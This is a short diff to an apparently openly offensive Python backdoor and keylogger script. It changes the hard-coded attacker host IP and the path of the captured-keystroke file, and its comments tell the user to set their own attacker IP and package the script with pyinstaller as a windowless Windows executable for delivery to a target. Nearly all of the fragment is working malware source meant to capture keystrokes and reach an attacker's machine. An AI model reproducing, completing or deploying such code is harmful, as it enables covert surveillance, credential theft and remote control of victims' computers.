@@ -9,7 +9,7 @@ import base64
 import threading
 import pynput.keyboard
 #[!!!!!!!!!!!!!!!] WARNING change it to your own ip host(attacker) and uncomment it
-host_ip = "192.168.2.4" 
+host_ip = "192.168.2.8" 
 #first before deliver make it exe or linux executable file :
 #Linux User Setup wine environment with python3 directory
 # target is windows then command : wine /root/.wine/drive_c/pyinstaller.exe --onefile --noconsole Backdoor.py 
@@ -18,7 +18,7 @@ keys = ""
 try:
 	path = os.environ["appdata"]+"\\keylogger.txt"
 except :
-	path = 	"\\temp\\keylogger.txt"
+	path = 	"\\tmp\\keylogger.txt"
 
 def process_keys(key) :
 	global keys
